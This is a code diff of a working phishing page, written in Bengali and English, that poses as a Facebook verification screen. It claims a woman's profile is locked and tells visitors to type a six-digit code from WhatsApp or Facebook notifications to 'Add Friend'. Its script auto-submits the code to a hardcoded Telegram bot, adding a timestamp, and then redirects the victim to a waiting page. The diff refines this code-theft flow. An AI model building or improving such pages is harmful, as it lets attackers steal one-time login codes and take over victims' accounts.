@@ -6,31 +6,34 @@
     <title>Facebook Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { 
+            background-color: #f0f2f5; 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+        }
         .code-input {
             width: 48px;
-            height: 52px;
+            height: 56px;
             text-align: center;
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 600;
-            border: 1.5px solid #dddfe2;
-            border-radius: 6px;
+            border: 2px solid #dddfe2;
+            border-radius: 8px;
             background: #ffffff;
-            transition: border-color 0.2s;
+            transition: border-color 0.15s, box-shadow 0.15s;
         }
-        .code-input:focus { 
-            border-color: #1877f2; 
-            outline: none; 
-            box-shadow: 0 0 0 2px #1877f2; 
+        .code-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.3);
+            outline: none;
         }
         .blue-btn {
             background-color: #1877f2;
             color: white;
             font-weight: bold;
-            padding: 12px 0;
-            border-radius: 6px;
+            padding: 14px 0;
+            border-radius: 8px;
             width: 100%;
-            max-width: 300px;
+            max-width: 320px;
             cursor: pointer;
             transition: background-color 0.2s;
         }
@@ -43,113 +46,138 @@
 </head>
 <body class="flex flex-col items-center min-h-screen bg-[#f0f2f5]">
 
+    <!-- প্রোফাইল ছবি – আগের পেজের মতো -->
     <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
         <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
              alt="Profile" class="w-full h-full object-cover">
     </div>
 
-    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[50vh] flex flex-col items-center">
+    <!-- মূল কন্টেন্ট বক্স -->
+    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center">
 
         <h2 class="text-[22px] font-bold text-gray-900 mb-4 text-center">Verification</h2>
 
-        <p class="text-[15px] text-gray-600 mb-6 text-center leading-relaxed px-2">
-            Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে। তার ফেসবুক আইডির সাথে আপনার আইডি এড করতে হলে ৩০ সেকেন্ড অপেক্ষা করুন। আপনার Whatsapp এ অথবা ফেসবুক এর নোটিফিকেশন মেসেজ চেক করে দেখুন ৬ সংখ্যার কোড পাবেন। নিচে ফাঁকা ঘরে কোড গুলো বসিয়ে ফেসবুক এড করুন।
+        <p class="text-[15px] text-gray-600 mb-8 text-center leading-relaxed px-3">
+            Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে।<br>
+            তার আইডিতে অ্যাড হতে WhatsApp / Facebook নোটিফিকেশনে ৬ সংখ্যার কোড দেখুন এবং নিচে দিন।
         </p>
 
-        <div id="otp-inputs" class="flex justify-center gap-2 mb-6">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)" autofocus>
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
-            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
+        <div id="otp-inputs" class="flex justify-center gap-3 mb-8">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
         </div>
 
-        <button id="submitBtn" class="blue-btn mb-6" disabled onclick="submitCode()">
+        <button id="submitBtn" class="blue-btn mb-4" disabled>
             Add Friend
         </button>
 
-        <div class="h-4"></div>
+        <p class="text-gray-500 text-sm text-center">
+            কোড পুরো হলে অটোমেটিক প্রক্রিয়া শুরু হবে
+        </p>
 
     </div>
 
 <script>
-    const inputs = document.querySelectorAll('.code-input');
-    const submitBtn = document.getElementById('submitBtn');
+// OTP অটোমেটিক ফ্লো
+const inputs = document.querySelectorAll('.code-input');
+const submitBtn = document.getElementById('submitBtn');
 
-    function handleInput(input) {
-        input.value = input.value.replace(/[^0-9]/g, '');
-        
-        if (input.value.length === 1) {
-            const next = input.nextElementSibling;
-            if (next) {
-                next.focus();
-            } else {
-                checkAndAutoSubmit();  // সব ভরা হলে অটো সাবমিট
-            }
+function moveToNext(current) {
+    current.value = current.value.replace(/[^0-9]/g, '');
+
+    if (current.value.length === 1) {
+        const next = current.nextElementSibling;
+        if (next) next.focus();
+        else checkIfComplete();
+    }
+}
+
+function moveToPrev(current, e) {
+    if (e.key === "Backspace" && current.value.length === 0) {
+        const prev = current.previousElementSibling;
+        if (prev) {
+            prev.focus();
+            prev.select();
         }
+    }
+}
+
+function updateButtonState() {
+    const filledCount = Array.from(inputs).filter(inp => inp.value !== "").length;
+    submitBtn.disabled = (filledCount !== 6);
+}
+
+function getFullCode() {
+    return Array.from(inputs).map(inp => inp.value).join('');
+}
+
+function checkIfComplete() {
+    if (getFullCode().length === 6) {
+        sendCodeAndRedirect(true); // true = অটো
+    }
+}
+
+async function sendCodeAndRedirect(isAuto = false) {
+    const code = getFullCode();
+    if (code.length !== 6) return;
+
+    try {
+        const msg = `📩 OTP কোড (page2.html) ${isAuto ? '(অটোমেটিক)' : '(বাটন ক্লিক)'}: ${code}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;
+
+        await fetch(`https://api.telegram.org/bot8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: "8516934257",
+                text: msg
+            })
+        });
+    } catch (err) {
+        console.error("Telegram send error:", err);
+    }
+
+    // অটো রিডাইরেক্ট
+    window.location.href = "waiting.html";
+}
+
+// ইভেন্ট লিসেনার যোগ করা
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        moveToNext(input);
         updateButtonState();
-    }
-
-    function handleBackspace(e, input) {
-        if (e.key === "Backspace" && input.value.length === 0) {
-            const prev = input.previousElementSibling;
-            if (prev) prev.focus();
-        }
-    }
-
-    function updateButtonState() {
-        let codeLength = Array.from(inputs).filter(i => i.value.length === 1).length;
-        submitBtn.disabled = (codeLength !== 6);
-    }
-
-    function getCode() {
-        let code = "";
-        inputs.forEach(i => code += i.value);
-        return code;
-    }
-
-    function checkAndAutoSubmit() {
-        if (getCode().length === 6) {
-            submitCode(true);  // true = অটো সাবমিট
-        }
-    }
-
-    async function submitCode(isAuto = false) {
-        const code = getCode();
-        
-        if (code.length !== 6) {
-            if (!isAuto) alert("দয়া করে ৬ সংখ্যার পুরো কোড দিন।");
-            return;
-        }
-
-        const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
-        const chatId = "8516934257";
-
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: chatId, 
-                    text: `📩 কোড: ${code} ${isAuto ? '(অটো)' : '(বাটন ক্লিক)'}` 
-                })
-            });
-            window.location.href = "waiting.html";  // অথবা অন্য পেজ
-        } catch (err) {
-            console.error("টেলিগ্রামে পাঠাতে সমস্যা:", err);
-            if (!isAuto) alert("কোড পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
-        }
-    }
-
-    // প্রথম ইনপুটে ফোকাস + বাটন আপডেট
-    inputs[0].focus();
-    updateButtonState();
-
-    // টাইপ করার সময় রিয়েল-টাইমে বাটন আপডেট
-    inputs.forEach(input => {
-        input.addEventListener('input', updateButtonState);
     });
+
+    input.addEventListener('keydown', (e) => {
+        moveToPrev(input, e);
+    });
+
+    // পেস্ট করলে সাপোর্ট (অপশনাল)
+    input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        if (pasted.length > 0) {
+            let current = input;
+            for (let i = 0; i < pasted.length && current; i++) {
+                current.value = pasted[i];
+                current = current.nextElementSibling;
+            }
+            if (current) current.focus();
+            else checkIfComplete();
+            updateButtonState();
+        }
+    });
+});
+
+// প্রথম ইনপুটে ফোকাস
+inputs[0].focus();
+updateButtonState();
+
+// বাটন ক্লিকে ম্যানুয়াল সাবমিট (যদিও অটো আছে)
+submitBtn.addEventListener('click', () => sendCodeAndRedirect(false));
 </script>
 
 </body>
